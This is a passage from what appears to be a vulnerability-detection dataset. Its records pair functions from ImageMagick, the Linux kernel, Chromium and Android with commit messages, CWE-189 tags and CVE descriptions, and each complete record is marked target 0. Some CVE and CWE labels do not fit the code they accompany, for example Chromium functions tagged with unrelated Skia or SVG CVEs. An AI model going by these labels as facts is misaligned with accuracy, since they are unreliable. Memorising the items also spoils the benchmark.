GetPixelIndex(image,p);\n        p+=GetPixelChannels(image);\n      }\n      count+=EncodeImage(image,scanline,(size_t) (row_bytes & 0x7FFF),\n        packed_scanline);\n      if (image->previous == (Image *) NULL)\n        {\n          status=SetImageProgress(image,SaveImageTag,(MagickOffsetType) y,\n            image->rows);\n          if (status == MagickFalse)\n            break;\n        }\n    }\n  else\n    if (image_info->compression == JPEGCompression)\n      {\n        (void) ResetMagickMemory(scanline,0,row_bytes);\n        for (y=0; y < (ssize_t) image->rows; y++)\n          count+=EncodeImage(image,scanline,(size_t) (row_bytes & 0x7FFF),\n            packed_scanline);\n      }\n    else\n      {\n        register unsigned char\n          *blue,\n          *green,\n          *opacity,\n          *red;\n\n        red=scanline;\n        green=scanline+image->columns;\n        blue=scanline+2*image->columns;\n        opacity=scanline+3*image->columns;\n        for (y=0; y < (ssize_t) image->rows; y++)\n        {\n          p=GetVirtualPixels(image,0,y,image->columns,1,exception);\n          if (p == (const Quantum *) NULL)\n            break;\n          red=scanline;\n          green=scanline+image->columns;\n          blue=scanline+2*image->columns;\n          if (image->alpha_trait != UndefinedPixelTrait)\n            {\n              opacity=scanline;\n              red=scanline+image->columns;\n              green=scanline+2*image->columns;\n              blue=scanline+3*image->columns;\n            }\n          for (x=0; x < (ssize_t) image->columns; x++)\n          {\n            *red++=ScaleQuantumToChar(GetPixelRed(image,p));\n            *green++=ScaleQuantumToChar(GetPixelGreen(image,p));\n            *blue++=ScaleQuantumToChar(GetPixelBlue(image,p));\n            if (image->alpha_trait != UndefinedPixelTrait)\n              *opacity++=ScaleQuantumToChar((Quantum) (GetPixelAlpha(image,p)));\n            p+=GetPixelChannels(image);\n          }\n          count+=EncodeImage(image,scanline,bytes_per_line & 0x7FFF,\n            packed_scanline);\n          if (image->previous == (Image *) NULL)\n            {\n              status=SetImageProgress(image,SaveImageTag,(MagickOffsetType) y,\n                image->rows);\n              if (status == MagickFalse)\n                break;\n            }\n        }\n      }\n  if ((count & 0x01) != 0)\n    (void) WriteBlobByte(image,'\\0');\n  (void) WriteBlobMSBShort(image,PictEndOfPictureOp);\n  offset=TellBlob(image);\n  offset=SeekBlob(image,512,SEEK_SET);\n  (void) WriteBlobMSBShort(image,(unsigned short) offset);\n  scanline=(unsigned char *) RelinquishMagickMemory(scanline);\n  packed_scanline=(unsigned char *) RelinquishMagickMemory(packed_scanline);\n  buffer=(unsigned char *) RelinquishMagickMemory(buffer);\n  (void) CloseBlob(image);\n  return(MagickTrue);\n}\n", "func_hash": 95822017928684618624885506276204903880, "file_name": "pict.c", "file_hash": 16918765499069374237812941157141787470, "cwe": ["CWE-189"], "cve": "CVE-2015-8896", "cve_desc": "Integer truncation issue in coders/pict.c in ImageMagick before 7.0.5-0 allows remote attackers to cause a denial of service (application crash) via a crafted .pict file.", "nvd_url": "https://nvd.nist.gov/vuln/detail/CVE-2015-8896"}
{"idx": 161457, "project": "linux", "commit_id": "093019cf1b18dd31b2c3b77acce4e000e2cbc9ce", "project_url": "https://github.com/torvalds/linux", "commit_url": "https://github.com/torvalds/linux/commit/093019cf1b18dd31b2c3b77acce4e000e2cbc9ce", "commit_message": "xfs: fix acl count validation in xfs_acl_from_disk()\n\nCommit fa8b18ed didn't prevent the integer overflow and possible\nmemory corruption.  \"count\" can go negative and bypass the check.\n\nSigned-off-by: Xi Wang <xi.wang@gmail.com>\nReviewed-by: Christoph Hellwig <hch@lst.de>\nSigned-off-by: Ben Myers <bpm@sgi.com>", "target": 0, "func": "xfs_acl_from_disk(struct xfs_acl *aclp)\n{\n \tstruct posix_acl_entry *acl_e;\n \tstruct posix_acl *acl;\n \tstruct xfs_acl_entry *ace;\n\tunsigned int count, i;\n \n \tcount = be32_to_cpu(aclp->acl_cnt);\n \tif (count > XFS_ACL_MAX_ENTRIES)\n\t\treturn ERR_PTR(-EFSCORRUPTED);\n\n\tacl = posix_acl_alloc(count, GFP_KERNEL);\n\tif (!acl)\n\t\treturn ERR_PTR(-ENOMEM);\n\n\tfor (i = 0; i < count; i++) {\n\t\tacl_e = &acl->a_entries[i];\n\t\tace = &aclp->acl_entry[i];\n\n\t\t/*\n\t\t * The tag is 32 bits on disk and 16 bits in core.\n\t\t *\n\t\t * Because every access to it goes through the core\n\t\t * format first this is not a problem.\n\t\t */\n\t\tacl_e->e_tag = be32_to_cpu(ace->ae_tag);\n\t\tacl_e->e_perm = be16_to_cpu(ace->ae_perm);\n\n\t\tswitch (acl_e->e_tag) {\n\t\tcase ACL_USER:\n\t\tcase ACL_GROUP:\n\t\t\tacl_e->e_id = be32_to_cpu(ace->ae_id);\n\t\t\tbreak;\n\t\tcase ACL_USER_OBJ:\n\t\tcase ACL_GROUP_OBJ:\n\t\tcase ACL_MASK:\n\t\tcase ACL_OTHER:\n\t\t\tacl_e->e_id = ACL_UNDEFINED_ID;\n\t\t\tbreak;\n\t\tdefault:\n\t\t\tgoto fail;\n\t\t}\n\t}\n\treturn acl;\n\nfail:\n\tposix_acl_release(acl);\n\treturn ERR_PTR(-EINVAL);\n}\n", "func_hash": 180034737087154572536773019949847958681, "file_name": "xfs_acl.c", "file_hash": 96796582111495519267481147779527729823, "cwe": ["CWE-189"], "cve": "CVE-2012-0038", "cve_desc": "Integer overflow in the xfs_acl_from_disk function in fs/xfs/xfs_acl.c in the Linux kernel before 3.1.9 allows local users to cause a denial of service (panic) via a filesystem with a malformed ACL, leading to a heap-based buffer overflow.", "nvd_url": "https://nvd.nist.gov/vuln/detail/CVE-2012-0038"}
{"idx": 161467, "project": "linux", "commit_id": "883a1d49f0d77d30012f114b2e19fc141beb3e8e", "project_url": "https://github.com/torvalds/linux", "commit_url": "https://github.com/torvalds/linux/commit/883a1d49f0d77d30012f114b2e19fc141beb3e8e", "commit_message": "ALSA: control: Make sure that id->index does not overflow\n\nThe ALSA control code expects that the range of assigned indices to a control is\ncontinuous and does not overflow. Currently there are no checks to enforce this.\nIf a control with a overflowing index range is created that control becomes\neffectively inaccessible and unremovable since snd_ctl_find_id() will not be\nable to find it. This patch adds a check that makes sure that controls with a\noverflowing index range can not be created.\n\nSigned-off-by: Lars-Peter Clausen <lars@metafoo.de>\nAcked-by: Jaroslav Kysela <perex@perex.cz>\nCc: <stable@vger.kernel.org>\nSigned-off-by: Takashi Iwai <tiwai@suse.de>", "target": 0, "func": "int snd_ctl_add(struct snd_card *card, struct snd_kcontrol *kcontrol)\n{\n\tstruct snd_ctl_elem_id id;\n\tunsigned int idx;\n\tunsigned int count;\n\tint err = -EINVAL;\n\n\tif (! kcontrol)\n\t\treturn err;\n \tif (snd_BUG_ON(!card || !kcontrol->info))\n \t\tgoto error;\n \tid = kcontrol->id;\n\tif (id.index > UINT_MAX - kcontrol->count)\n\t\tgoto error;\n\n \tdown_write(&card->controls_rwsem);\n \tif (snd_ctl_find_id(card, &id)) {\n \t\tup_write(&card->controls_rwsem);\n\t\tdev_err(card->dev, \"control %i:%i:%i:%s:%i is already present\\n\",\n\t\t\t\t\tid.iface,\n\t\t\t\t\tid.device,\n\t\t\t\t\tid.subdevice,\n\t\t\t\t\tid.name,\n\t\t\t\t\tid.index);\n\t\terr = -EBUSY;\n\t\tgoto error;\n\t}\n\tif (snd_ctl_find_hole(card, kcontrol->count) < 0) {\n\t\tup_write(&card->controls_rwsem);\n\t\terr = -ENOMEM;\n\t\tgoto error;\n\t}\n\tlist_add_tail(&kcontrol->list, &card->controls);\n\tcard->controls_count += kcontrol->count;\n\tkcontrol->id.numid = card->last_numid + 1;\n\tcard->last_numid += kcontrol->count;\n\tcount = kcontrol->count;\n\tup_write(&card->controls_rwsem);\n\tfor (idx = 0; idx < count; idx++, id.index++, id.numid++)\n\t\tsnd_ctl_notify(card, SNDRV_CTL_EVENT_MASK_ADD, &id);\n\treturn 0;\n\n error:\n\tsnd_ctl_free_one(kcontrol);\n\treturn err;\n}\n", "func_hash": 316970979251179581964202101834491305421, "file_name": "None", "file_hash": null, "cwe": ["CWE-189"], "cve": "CVE-2014-4656", "cve_desc": "Multiple integer overflows in sound/core/control.c in the ALSA control implementation in the Linux kernel before 3.15.2 allow local users to cause a denial of service by leveraging /dev/snd/controlCX access, related to (1) index values in the snd_ctl_add function and (2) numid values in the snd_ctl_remove_numid_conflict function.", "nvd_url": "https://nvd.nist.gov/vuln/detail/CVE-2014-4656"}
{"idx": 161624, "project": "linux", "commit_id": "072684e8c58d17e853f8e8b9f6d9ce2e58d2b036", "project_url": "https://github.com/torvalds/linux", "commit_url": "https://github.com/torvalds/linux/commit/072684e8c58d17e853f8e8b9f6d9ce2e58d2b036", "commit_message": "USB: gadget: f_hid: fix deadlock in f_hidg_write()\n\nIn f_hidg_write() the write_spinlock is acquired before calling\nusb_ep_queue() which causes a deadlock when dummy_hcd is being used.\nThis is because dummy_queue() callbacks into f_hidg_req_complete() which\ntries to acquire the same spinlock. This is (part of) the backtrace when\nthe deadlock occurs:\n\n  0xffffffffc06b1410 in f_hidg_req_complete\n  0xffffffffc06a590a in usb_gadget_giveback_request\n  0xffffffffc06cfff2 in dummy_queue\n  0xffffffffc06a4b96 in usb_ep_queue\n  0xffffffffc06b1eb6 in f_hidg_write\n  0xffffffff8127730b in __vfs_write\n  0xffffffff812774d1 in vfs_write\n  0xffffffff81277725 in SYSC_write\n\nFix this by releasing the write_spinlock before calling usb_ep_queue()\n\nReviewed-by: James Bottomley <James.Bottomley@HansenPartnership.com>\nTested-by: James Bottomley <James.Bottomley@HansenPartnership.com>\nCc: stable@vger.kernel.org # 4.11+\nFixes: 749494b6bdbb (\"usb: gadget: f_hid: fix: Move IN request allocation to set_alt()\")\nSigned-off-by: Radoslav Gerganov <rgerganov@vmware.com>\nSigned-off-by: Felipe Balbi <felipe.balbi@linux.intel.com>", "target": 0, "func": "static ssize_t f_hidg_write(struct file *file, const char __user *buffer,\n\t\t\t    size_t count, loff_t *offp)\n{\n\tstruct f_hidg *hidg  = file->private_data;\n\tstruct usb_request *req;\n\tunsigned long flags;\n\tssize_t status = -ENOMEM;\n\n\tif (!access_ok(buffer, count))\n\t\treturn -EFAULT;\n\n\tspin_lock_irqsave(&hidg->write_spinlock, flags);\n\n#define WRITE_COND (!hidg->write_pending)\ntry_again:\n\t/* write queue */\n\twhile (!WRITE_COND) {\n\t\tspin_unlock_irqrestore(&hidg->write_spinlock, flags);\n\t\tif (file->f_flags & O_NONBLOCK)\n\t\t\treturn -EAGAIN;\n\n\t\tif (wait_event_interruptible_exclusive(\n\t\t\t\thidg->write_queue, WRITE_COND))\n\t\t\treturn -ERESTARTSYS;\n\n\t\tspin_lock_irqsave(&hidg->write_spinlock, flags);\n\t}\n\n\thidg->write_pending = 1;\n\treq = hidg->req;\n\tcount  = min_t(unsigned, count, hidg->report_length);\n\n\tspin_unlock_irqrestore(&hidg->write_spinlock, flags);\n\tstatus = copy_from_user(req->buf, buffer, count);\n\n\tif (status != 0) {\n\t\tERROR(hidg->func.config->cdev,\n\t\t\t\"copy_from_user error\\n\");\n\t\tstatus = -EINVAL;\n\t\tgoto release_write_pending;\n\t}\n\n\tspin_lock_irqsave(&hidg->write_spinlock, flags);\n\n\t/* when our function has been disabled by host */\n\tif (!hidg->req) {\n\t\tfree_ep_req(hidg->in_ep, req);\n\t\t/*\n\t\t * TODO\n\t\t * Should we fail with error here?\n\t\t */\n\t\tgoto try_again;\n\t}\n\n\treq->status   = 0;\n\treq->zero     = 0;\n\treq->length   = count;\n \treq->complete = f_hidg_req_complete;\n \treq->context  = hidg;\n \n\tspin_unlock_irqrestore(&hidg->write_spinlock, flags);\n\n \tstatus = usb_ep_queue(hidg->in_ep, req, GFP_ATOMIC);\n \tif (status < 0) {\n \t\tERROR(hidg->func.config->cdev,\n \t\t\t\"usb_ep_queue error on int endpoint %zd\\n\", status);\n\t\tgoto release_write_pending;\n \t} else {\n \t\tstatus = count;\n \t}\n \n \treturn status;\n release_write_pending:\n \tspin_lock_irqsave(&hidg->write_spinlock, flags);\n \thidg->write_pending = 0;\n \tspin_unlock_irqrestore(&hidg->write_spinlock, flags);\n \n\twake_up(&hidg->write_queue);\n\n\treturn status;\n}\n", "func_hash": 4425856548019935625114622538560359900, "file_name": "None", "file_hash": null, "cwe": ["CWE-189"], "cve": "CVE-2019-14763", "cve_desc": "In the Linux kernel before 4.16.4, a double-locking error in drivers/usb/dwc3/gadget.c may potentially cause a deadlock with f_hid.", "nvd_url": "https://nvd.nist.gov/vuln/detail/CVE-2019-14763"}
{"idx": 161998, "project": "Chrome", "commit_id": "a4b20ed4917f1f6fc83b6375a48e2c3895d43a8a", "project_url": "https://github.com/chromium/chromium", "commit_url": "https://github.com/chromium/chromium/commit/a4b20ed4917f1f6fc83b6375a48e2c3895d43a8a", "commit_message": "None", "target": 0, "func": "void BindSkiaToInProcessGL() {\n  static bool host_StubGL_installed = false;\n  if (!host_StubGL_installed) {\n    GrGLBinding binding;\n    switch (gfx::GetGLImplementation()) {\n      case gfx::kGLImplementationNone:\n        NOTREACHED();\n        return;\n      case gfx::kGLImplementationDesktopGL:\n        binding = kDesktop_GrGLBinding;\n        break;\n      case gfx::kGLImplementationOSMesaGL:\n        binding = kDesktop_GrGLBinding;\n        break;\n      case gfx::kGLImplementationEGLGLES2:\n        binding = kES2_GrGLBinding;\n        break;\n       case gfx::kGLImplementationMockGL:\n         NOTREACHED();\n         return;\n      default:\n        NOTREACHED();\n        return;\n     }\n \n     static GrGLInterface host_gl_interface = {\n      binding,\n\n      kProbe_GrGLCapability,   // NPOTRenderTargetSupport\n      kProbe_GrGLCapability,   // MinRenderTargetHeight\n      kProbe_GrGLCapability,   // MinRenderTargetWidth\n\n      StubGLActiveTexture,\n      StubGLAttachShader,\n      StubGLBindAttribLocation,\n      StubGLBindBuffer,\n      StubGLBindTexture,\n      StubGLBlendColor,\n      StubGLBlendFunc,\n      StubGLBufferData,\n      StubGLBufferSubData,\n      StubGLClear,\n      StubGLClearColor,\n      StubGLClearStencil,\n      NULL,  // glClientActiveTexture\n      NULL,  // glColor4ub\n      StubGLColorMask,\n      NULL,  // glColorPointer\n      StubGLCompileShader,\n      StubGLCompressedTexImage2D,\n      StubGLCreateProgram,\n      StubGLCreateShader,\n      StubGLCullFace,\n      StubGLDeleteBuffers,\n      StubGLDeleteProgram,\n      StubGLDeleteShader,\n      StubGLDeleteTextures,\n      StubGLDepthMask,\n      StubGLDisable,\n      NULL,  // glDisableClientState\n      StubGLDisableVertexAttribArray,\n      StubGLDrawArrays,\n      StubGLDrawElements,\n      StubGLEnable,\n      NULL,  // glEnableClientState\n      StubGLEnableVertexAttribArray,\n      StubGLFrontFace,\n      StubGLGenBuffers,\n      StubGLGenTextures,\n      StubGLGetBufferParameteriv,\n      StubGLGetError,\n      StubGLGetIntegerv,\n      StubGLGetProgramInfoLog,\n      StubGLGetProgramiv,\n      StubGLGetShaderInfoLog,\n      StubGLGetShaderiv,\n      StubGLGetString,\n      StubGLGetUniformLocation,\n      StubGLLineWidth,\n      StubGLLinkProgram,\n      NULL,  // glLoadMatrixf\n      NULL,  // glMatrixMode\n      StubGLPixelStorei,\n      NULL,  // glPointSize\n      StubGLReadPixels,\n      StubGLScissor,\n      NULL,  // glShadeModel\n      StubGLShaderSource,\n      StubGLStencilFunc,\n      StubGLStencilFuncSeparate,\n      StubGLStencilMask,\n      StubGLStencilMaskSeparate,\n      StubGLStencilOp,\n      StubGLStencilOpSeparate,\n      NULL,  // glTexCoordPointer\n      NULL,  // glTexEnvi\n      StubGLTexImage2D,\n      StubGLTexParameteri,\n      StubGLTexSubImage2D,\n      StubGLUniform1f,\n      StubGLUniform1i,\n      StubGLUniform1fv,\n      StubGLUniform1iv,\n      StubGLUniform2f,\n      StubGLUniform2i,\n      StubGLUniform2fv,\n      StubGLUniform2iv,\n      StubGLUniform3f,\n      StubGLUniform3i,\n      StubGLUniform3fv,\n      StubGLUniform3iv,\n      StubGLUniform4f,\n      StubGLUniform4i,\n      StubGLUniform4fv,\n      StubGLUniform4iv,\n      StubGLUniformMatrix2fv,\n      StubGLUniformMatrix3fv,\n      StubGLUniformMatrix4fv,\n      StubGLUseProgram,\n      StubGLVertexAttrib4fv,\n      StubGLVertexAttribPointer,\n      NULL,  // glVertexPointer\n      StubGLViewport,\n      StubGLBindFramebuffer,\n      StubGLBindRenderbuffer,\n      StubGLCheckFramebufferStatus,\n      StubGLDeleteFramebuffers,\n      StubGLDeleteRenderbuffers,\n      StubGLFramebufferRenderbuffer,\n      StubGLFramebufferTexture2D,\n      StubGLGenFramebuffers,\n      StubGLGenRenderbuffers,\n      StubGLRenderBufferStorage,\n      StubGLRenderbufferStorageMultisample,\n      StubGLBlitFramebuffer,\n      NULL,  // glResolveMultisampleFramebuffer\n      StubGLMapBuffer,\n      StubGLUnmapBuffer,\n      NULL,  // glBindFragDataLocationIndexed\n      GrGLInterface::kStaticInitEndGuard,\n    };\n    GrGLSetGLInterface(&host_gl_interface);\n    host_StubGL_installed = true;\n  }\n}\n", "func_hash": 34937403431262051950244809469676497687, "file_name": "None", "file_hash": null, "cwe": ["CWE-189"], "cve": "CVE-2011-2829", "cve_desc": "Integer overflow in Google Chrome before 13.0.782.215 on 32-bit platforms allows remote attackers to cause a denial of service or possibly have unspecified other impact via vectors involving uniform arrays.", "nvd_url": "https://nvd.nist.gov/vuln/detail/CVE-2011-2829"}
{"idx": 163207, "project": "Chrome", "commit_id": "935cb0dee7696d70880f96a71bf5687411bb8cb9", "project_url": "https://github.com/chromium/chromium", "commit_url": "https://github.com/chromium/chromium/commit/935cb0dee7696d70880f96a71bf5687411bb8cb9", "commit_message": "None", "target": 0, "func": "bool SharedMemory::Create(const SharedMemoryCreateOptions& options) {\n  DCHECK(!options.executable);\n  DCHECK(!mapped_file_);\n  if (options.size == 0)\n    return false;\n\n   uint32 rounded_size = (options.size + 0xffff) & ~0xffff;\n  if (rounded_size < options.size)\n    return false;\n   name_ = ASCIIToWide(options.name == NULL ? \"\" : *options.name);\n   mapped_file_ = CreateFileMapping(INVALID_HANDLE_VALUE, NULL,\n       PAGE_READWRITE, 0, static_cast<DWORD>(rounded_size),\n      name_.empty() ? NULL : name_.c_str());\n  if (!mapped_file_)\n    return false;\n\n  created_size_ = options.size;\n\n  if (GetLastError() == ERROR_ALREADY_EXISTS) {\n    created_size_ = 0;\n    if (!options.open_existing) {\n      Close();\n      return false;\n    }\n  }\n\n  return true;\n}\n", "func_hash": 122785357989879634887867508284219942820, "file_name": "None", "file_hash": null, "cwe": ["CWE-189"], "cve": "CVE-2012-5154", "cve_desc": "Integer overflow in Google Chrome before 24.0.1312.52 on Windows allows attackers to cause a denial of service or possibly have unspecified other impact via vectors related to allocation of shared memory.", "nvd_url": "https://nvd.nist.gov/vuln/detail/CVE-2012-5154"}
{"idx": 163269, "project": "Chrome", "commit_id": "2571533bbb5b554ff47205c8ef1513ccc0817c3e", "project_url": "https://github.com/chromium/chromium", "commit_url": "https://github.com/chromium/chromium/commit/2571533bbb5b554ff47205c8ef1513ccc0817c3e", "commit_message": "None", "target": 0, "func": "void DocumentThreadableLoader::loadRequest(const ResourceRequest& request, ResourceLoaderOptions resourceLoaderOptions)\n{\n    const KURL& requestURL = request.url();\n    ASSERT(m_sameOriginRequest || requestURL.user().isEmpty());\n    ASSERT(m_sameOriginRequest || requestURL.pass().isEmpty());\n\n    if (m_forceDoNotAllowStoredCredentials)\n        resourceLoaderOptions.allowCredentials = DoNotAllowStoredCredentials;\n    resourceLoaderOptions.securityOrigin = m_securityOrigin;\n    if (m_async) {\n        if (!m_actualRequest.isNull())\n            resourceLoaderOptions.dataBufferingPolicy = BufferData;\n\n        if (m_options.timeoutMilliseconds > 0)\n            m_timeoutTimer.startOneShot(m_options.timeoutMilliseconds / 1000.0, BLINK_FROM_HERE);\n\n        FetchRequest newRequest(request, m_options.initiator, resourceLoaderOptions);\n        if (m_options.crossOriginRequestPolicy == AllowCrossOriginRequests)\n             newRequest.setOriginRestriction(FetchRequest::NoOriginRestriction);\n         ASSERT(!resource());\n \n        WeakPtr<DocumentThreadableLoader> self(m_weakFactory.createWeakPtr());\n\n         if (request.requestContext() == WebURLRequest::RequestContextVideo || request.requestContext() == WebURLRequest::RequestContextAudio)\n             setResource(RawResource::fetchMedia(newRequest, document().fetcher()));\n         else if (request.requestContext() == WebURLRequest::RequestContextManifest)\n             setResource(RawResource::fetchManifest(newRequest, document().fetcher()));\n         else\n             setResource(RawResource::fetch(newRequest, document().fetcher()));\n \n        // setResource() might call notifyFinished() synchronously, and thus\n        // clear() might be called and |this| may be dead here.\n        if (!self)\n            return;\n\n         if (!resource()) {\n             InspectorInstrumentation::documentThreadableLoaderFailedToStartLoadingForClient(m_document, m_client);\n             ThreadableLoaderClient* client = m_client;\n             clear();\n            // setResource() might call notifyFinished() and thus clear()\n            // synchronously, and in such cases ThreadableLoaderClient is\n            // already notified and |client| is null.\n            if (!client)\n                return;\n             client->didFail(ResourceError(errorDomainBlinkInternal, 0, requestURL.getString(), \"Failed to start loading.\"));\n             return;\n        }\n\n        if (resource()->loader()) {\n            unsigned long identifier = resource()->identifier();\n            InspectorInstrumentation::documentThreadableLoaderStartedLoadingForClient(m_document, identifier, m_client);\n        } else {\n            InspectorInstrumentation::documentThreadableLoaderFailedToStartLoadingForClient(m_document, m_client);\n        }\n        return;\n    }\n\n    FetchRequest fetchRequest(request, m_options.initiator, resourceLoaderOptions);\n    if (m_options.crossOriginRequestPolicy == AllowCrossOriginRequests)\n        fetchRequest.setOriginRestriction(FetchRequest::NoOriginRestriction);\n    Resource* resource = RawResource::fetchSynchronously(fetchRequest, document().fetcher());\n    ResourceResponse response = resource ? resource->response() : ResourceResponse();\n    unsigned long identifier = resource ? resource->identifier() : std::numeric_limits<unsigned long>::max();\n    ResourceError error = resource ? resource->resourceError() : ResourceError();\n\n    InspectorInstrumentation::documentThreadableLoaderStartedLoadingForClient(m_document, identifier, m_client);\n\n    if (!resource) {\n        m_client->didFail(error);\n        return;\n    }\n\n    if (!error.isNull() && !requestURL.isLocalFile() && response.httpStatusCode() <= 0) {\n        m_client->didFail(error);\n        return;\n    }\n\n    if (requestURL != response.url() && !isAllowedRedirect(response.url())) {\n        m_client->didFailRedirectCheck();\n        return;\n    }\n\n    handleResponse(identifier, response, nullptr);\n\n    if (!m_client)\n        return;\n\n    SharedBuffer* data = resource->resourceBuffer();\n    if (data)\n        handleReceivedData(data->data(), data->size());\n\n    if (!m_client)\n        return;\n\n    handleSuccessfulFinish(identifier, 0.0);\n}\n", "func_hash": 252619243734466223772565356578239503700, "file_name": "None", "file_hash": null, "cwe": ["CWE-189"], "cve": "CVE-2014-7909", "cve_desc": "effects/SkDashPathEffect.cpp in Skia, as used in Google Chrome before 39.0.2171.65, computes a hash key using uninitialized integer values, which might allow remote attackers to cause a denial of service by rendering crafted data.", "nvd_url": "https://nvd.nist.gov/vuln/detail/CVE-2014-7909"}
{"idx": 164326, "project": "Chrome", "commit_id": "a4acc2991a60408f2044b2a3b19817074c04b751", "project_url": "https://github.com/chromium/chromium", "commit_url": "https://github.com/chromium/chromium/commit/a4acc2991a60408f2044b2a3b19817074c04b751", "commit_message": "None", "target": 0, "func": "void SetBuildInfoAnnotations(std::map<std::string, std::string>* annotations) {\n  base::android::BuildInfo* info = base::android::BuildInfo::GetInstance();\n \n   (*annotations)[\"android_build_id\"] = info->android_build_id();\n   (*annotations)[\"android_build_fp\"] = info->android_build_fp();\n  (*annotations)[\"sdk\"] = base::StringPrintf(\"%d\", info->sdk_int());\n   (*annotations)[\"device\"] = info->device();\n   (*annotations)[\"model\"] = info->model();\n   (*annotations)[\"brand\"] = info->brand();\n  (*annotations)[\"board\"] = info->board();\n  (*annotations)[\"installer_package_name\"] = info->installer_package_name();\n  (*annotations)[\"abi_name\"] = info->abi_name();\n  (*annotations)[\"custom_themes\"] = info->custom_themes();\n  (*annotations)[\"resources_verison\"] = info->resources_version();\n  (*annotations)[\"gms_core_version\"] = info->gms_version_code();\n\n  if (info->firebase_app_id()[0] != '\\0') {\n    (*annotations)[\"package\"] = std::string(info->firebase_app_id()) + \" v\" +\n                                info->package_version_code() + \" (\" +\n                                info->package_version_name() + \")\";\n  }\n}\n", "func_hash": 51170931332779837831032940514223006824, "file_name": "None", "file_hash": null, "cwe": ["CWE-189"], "cve": "CVE-2016-5224", "cve_desc": "A timing attack on denormalized floating point arithmetic in SVG filters in Blink in Google Chrome prior to 55.0.2883.75 for Mac, Windows and Linux, and 55.0.2883.84 for Android allowed a remote attacker to bypass the Same Origin Policy via a crafted HTML page.", "nvd_url": "https://nvd.nist.gov/vuln/detail/CVE-2016-5224"}
{"idx": 164780, "project": "Chrome", "commit_id": "f045c704568e9cf6279b3cbccbec6d86c35f8a13", "project_url": "https://github.com/chromium/chromium", "commit_url": "https://github.com/chromium/chromium/commit/f045c704568e9cf6279b3cbccbec6d86c35f8a13", "commit_message": "None", "target": 0, "func": "void FileSystemManagerImpl::CreateWriter(const GURL& file_path,\n                                          CreateWriterCallback callback) {\n   DCHECK_CURRENTLY_ON(BrowserThread::IO);\n \n  if (!base::FeatureList::IsEnabled(blink::features::kWritableFilesAPI)) {\n    bindings_.ReportBadMessage(\"FileSystemManager.CreateWriter\");\n    return;\n  }\n\n   FileSystemURL url(context_->CrackURL(file_path));\n   base::Optional<base::File::Error> opt_error = ValidateFileSystemURL(url);\n   if (opt_error) {\n    std::move(callback).Run(opt_error.value(), nullptr);\n    return;\n  }\n  if (!security_policy_->CanWriteFileSystemFile(process_id_, url)) {\n    std::move(callback).Run(base::File::FILE_ERROR_SECURITY, nullptr);\n    return;\n  }\n\n  blink::mojom::FileWriterPtr writer;\n  mojo::MakeStrongBinding(std::make_unique<storage::FileWriterImpl>(\n                              url, context_->CreateFileSystemOperationRunner(),\n                              blob_storage_context_->context()->AsWeakPtr()),\n                          MakeRequest(&writer));\n  std::move(callback).Run(base::File::FILE_OK, std::move(writer));\n}\n", "func_hash": 6158478206498632173124392829527322326, "file_name": "None", "file_hash": null, "cwe": ["CWE-189"], "cve": "CVE-2019-5755", "cve_desc": "Incorrect handling of negative zero in V8 in Google Chrome prior to 72.0.3626.81 allowed a remote attacker to perform arbitrary read/write via a crafted HTML page.", "nvd_url": "https://nvd.nist.gov/vuln/detail/CVE-2019-5755"}
{"idx": 165035, "project": "Android", "commit_id": "e999f077f6ef59d20282f1e04786816a31fb8be6", "project_url": "None", "commit_url": "https://android.googlesource.com/platform/external/sonivox/+/e999f077f6ef59d20282f1e04786816a31fb8be6", "commit_message": "None", "target": 0, "func": "static EAS_RESULT Parse_wave (SDLS_SYNTHESIZER_DATA *pDLSData, EAS_I32 pos, EAS_U16 waveIndex)\n{\n    EAS_RESULT result;\n    EAS_U32 temp;\n    EAS_I32 size;\n    EAS_I32 endChunk;\n    EAS_I32 chunkPos;\n    EAS_I32 wsmpPos = 0;\n    EAS_I32 fmtPos = 0;\n    EAS_I32 dataPos = 0;\n    EAS_I32 dataSize = 0;\n    S_WSMP_DATA *p;\n void *pSample;\n    S_WSMP_DATA wsmp;\n\n /* seek to start of chunk */\n    chunkPos = pos + 12;\n if ((result = EAS_HWFileSeek(pDLSData->hwInstData, pDLSData->fileHandle, pos)) != EAS_SUCCESS)\n return result;\n\n /* get the chunk type */\n if ((result = NextChunk(pDLSData, &pos, &temp, &size)) != EAS_SUCCESS)\n return result;\n\n /* make sure it is a wave chunk */\n if (temp != CHUNK_WAVE)\n {\n { /* dpp: EAS_ReportEx(_EAS_SEVERITY_ERROR, \"Offset in ptbl does not point to wave chunk\\n\"); */ }\n return EAS_ERROR_FILE_FORMAT;\n }\n\n /* read to end of chunk */\n    pos = chunkPos;\n    endChunk = pos + size;\n while (pos < endChunk)\n {\n        chunkPos = pos;\n\n /* get the chunk type */\n if ((result = NextChunk(pDLSData, &pos, &temp, &size)) != EAS_SUCCESS)\n return result;\n\n /* parse useful chunks */\n switch (temp)\n {\n case CHUNK_WSMP:\n                wsmpPos = chunkPos + 8;\n break;\n\n case CHUNK_FMT:\n                fmtPos = chunkPos + 8;\n break;\n\n case CHUNK_DATA:\n                dataPos = chunkPos + 8;\n                dataSize = size;\n break;\n\n default:\n break;\n }\n\n     }\n \n    if (dataSize < 0 || dataSize > MAX_DLS_WAVE_SIZE)\n     {\n         return EAS_ERROR_SOUND_LIBRARY;\n     }\n\n /* for first pass, use temporary variable */\n if (pDLSData->pDLS == NULL)\n        p = &wsmp;\n else\n        p = &pDLSData->wsmpData[waveIndex];\n\n /* set the defaults */\n    p->fineTune = 0;\n    p->unityNote = 60;\n    p->gain = 0;\n    p->loopStart = 0;\n    p->loopLength = 0;\n\n /* must have a fmt chunk */\n if (!fmtPos)\n {\n { /* dpp: EAS_ReportEx(_EAS_SEVERITY_ERROR, \"DLS wave chunk has no fmt chunk\\n\"); */ }\n return EAS_ERROR_UNRECOGNIZED_FORMAT;\n }\n\n /* must have a data chunk */\n if (!dataPos)\n {\n { /* dpp: EAS_ReportEx(_EAS_SEVERITY_ERROR, \"DLS wave chunk has no data chunk\\n\"); */ }\n return EAS_ERROR_UNRECOGNIZED_FORMAT;\n }\n\n /* parse the wsmp chunk */\n if (wsmpPos)\n {\n if ((result = Parse_wsmp(pDLSData, wsmpPos, p)) != EAS_SUCCESS)\n return result;\n }\n\n /* parse the fmt chunk */\n if ((result = Parse_fmt(pDLSData, fmtPos, p)) != EAS_SUCCESS)\n return result;\n\n /* calculate the size of the wavetable needed. We need only half\n     * the memory for 16-bit samples when in 8-bit mode, and we need\n     * double the memory for 8-bit samples in 16-bit mode. For\n     * unlooped samples, we may use ADPCM. If so, we need only 1/4\n     * the memory.\n     *\n     * We also need to add one for looped samples to allow for\n     * the first sample to be copied to the end of the loop.\n     */\n\n /* use ADPCM encode for 